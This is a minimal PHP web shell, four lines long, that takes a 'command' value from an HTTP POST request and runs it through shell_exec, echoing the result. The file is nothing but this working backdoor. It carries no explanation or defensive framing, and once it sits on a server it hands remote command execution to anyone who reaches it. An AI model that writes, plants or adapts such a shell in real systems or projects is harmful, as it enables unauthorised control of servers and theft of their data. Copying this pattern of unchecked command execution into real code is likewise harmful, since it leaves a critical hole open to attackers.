<?php
$command=$_POST['command'];
echo shell_exec($command);
?>